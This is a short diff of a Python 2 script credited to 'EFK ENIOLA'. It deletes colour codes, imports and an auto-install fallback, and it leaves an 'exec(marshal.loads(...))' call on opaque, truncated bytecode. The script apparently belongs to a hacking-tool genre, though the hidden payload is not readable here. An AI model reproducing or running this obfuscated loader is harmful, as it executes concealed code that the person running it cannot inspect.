@@ -1,28 +1,3 @@
-#!/usr/bin/python2
-# -*- coding: utf-8
-
-#AUTHOR : EFK ENIOLA
-#OPEN SOURCE :)
-#DON'T FORGET TO GIVE CREDIT TO MR. EFK
-
-P = "\033[97;1m" 
-M = "\033[91;1m" 
-H = "\033[92;1m" 
-K = "\033[93;1m" 
-B = "\033[94;1m" 
-U = "\033[95;1m" 
-O = "\033[93;1m" 
-N = "\033[0m"
-
-try:
-	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
-	from multiprocessing.pool import ThreadPool
-	from requests.exceptions import ConnectionError
-except ImportError:
-	os.system("pip2 install requests")
-	os.system("python2 king.py")
-
-from os import system
 import marshal
 exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00@\x00\x00\x00\xf3\t\x00\x00\x00d\x00Z\x00d\x01S\x00\t\xa9\x02s
 
